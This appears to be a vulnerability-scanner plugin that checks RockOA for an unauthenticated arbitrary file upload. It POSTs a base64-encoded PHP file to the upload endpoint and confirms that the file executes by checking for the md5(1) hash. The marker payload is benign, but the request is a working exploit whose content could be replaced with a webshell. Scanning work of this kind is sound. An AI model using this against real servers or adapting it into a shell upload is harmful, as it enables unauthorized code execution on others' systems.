#!/usr/bin/evn python
#-*-:coding:utf-8 -*-
#Author:wonderkun
#Name:rockoa任意文件上传getshell（无需登陆）
#Refer:http://xiaomange.meximas.com/?p=317
#Data:2015/12/11
def assign(service,arg):
    if service=="rockoa":
        return True,arg
def audit(arg):
	url=arg+"mode/upload/ftpupload.php"
	#proxy=('127.0.0.1',8080)
	#upload file
	data="filepath=&filename=test.php&content=PD9waHAgZWNobyBtZDUoMSk/Pg=="

	code,head,res,errcode,finalurl=curl.curl2(url,post=data)
	#visit  file
	url1=arg+"test.php"
	code,head,res,errcode,finalurl=curl.curl2(url1)
	if code==200 and "c4ca4238a0b923820dcc509a6f75849b" in res:
		security_hole('file upload Vulnerable:'+url)

		return arg
if __name__== '__main__':
	from dummy import *
